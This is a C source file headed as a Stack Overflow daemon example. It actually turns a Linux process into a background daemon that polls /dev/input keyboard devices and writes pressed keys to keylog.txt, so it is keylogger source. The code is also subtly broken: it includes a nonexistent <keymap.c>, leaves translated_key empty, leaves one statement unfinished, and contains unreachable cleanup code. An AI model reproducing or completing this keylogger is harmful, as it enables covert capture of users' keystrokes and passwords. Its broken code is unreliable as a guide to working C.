/*
 * daemonize.c
 * This example daemonizes a process, writes a few log messages,
 * sleeps 20 seconds and terminates afterwards.
 * This is an answer to the stackoverflow question:
 * https://stackoverflow.com/questions/17954432/creating-a-daemon-in-linux/17955149#17955149
 * Fork this code: https://github.com/pasce/daemon-skeleton-linux-c
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>
#include <keymap.c>

static void skeleton_daemon()
{
    pid_t pid;

    /* Fork off the parent process */
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* On success: The child process becomes session leader */
    if (setsid() < 0)
        exit(EXIT_FAILURE);

    /* Catch, ignore and handle signals */
    //TODO: Implement a working signal handler */
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    /* Fork off for the second time*/
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* Set new file permissions */
    umask(0);

    /* Change the working directory to the root directory */
    /* or another appropriated directory */
    chdir("/");

    /* Close all open file descriptors */
    int x;
    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
    {
        close (x);
    }

    /* Open the log file */
    openlog ("firstdaemon", LOG_PID, LOG_DAEMON);
}

/* Return -1 if no key is being pressed, or else the lowest keycode 
   (c.f. linux/input-event-codes.h) of all the keys that are being pressed */
int keycode_of_key_being_pressed() { 
  FILE *kbd;
  glob_t kbddev;                                   // Glob structure for keyboard devices
  glob("/dev/input/by-path/*-kbd", 0, 0, &kbddev); // Glob select all keyboards
  int keycode = -1;                                // keycode of key being pressed
  for (int i = 0; i < kbddev.gl_pathc ; i++ ) {    // Loop through all the keyboard devices ...
    if (!(kbd = fopen(kbddev.gl_pathv[i], "r"))) { // ... and open them in turn (slow!)
      perror("Run as root to read keyboard devices"); 
      exit(1);      
    }

    char key_map[KEY_MAX/8 + 1];          // Create a bit array the size of the number of keys
    memset(key_map, 0, sizeof(key_map));  // Fill keymap[] with zero's
    ioctl(fileno(kbd), EVIOCGKEY(sizeof(key_map)), key_map); // Read keyboard state into keymap[]
    for (int k = 0; k < KEY_MAX/8 + 1 && keycode < 0; k++) { // scan bytes in key_map[] from left to right
      for (int j = 0; j <8 ; j++) {       // scan each byte from lsb to msb
        if (key_map[k] & (1 << j)) {      // if this bit is set: key was being pressed
          keycode = 8*k + j ;             // calculate corresponding keycode 
          break;                          // don't scan for any other keys
        }
      }   
    }

    fclose(kbd);
    if (keycode)
      break;                              // don't scan for any other keyboards
  }
  return keycode;
}

char translated_key(int key) {
  
}

int main()
{
    skeleton_daemon();
    FILE * keylog; 

    while (1) {
        keylog = fopen("keylog.txt","wt");
        while (1)    { //will only stop when the daemon dies
            int key = keycode_of_key_being_pressed(); // key acá tendría KEY_31 
            char translatedKey = 
            fprintf(keylog,"%c",translated_key);
            fflush(keylog);
        }
    }

    syslog (LOG_NOTICE, "Daemon terminated!");
    closelog();

    if (keylog != NULL)
      fclose(keylog);

    return EXIT_SUCCESS;
}

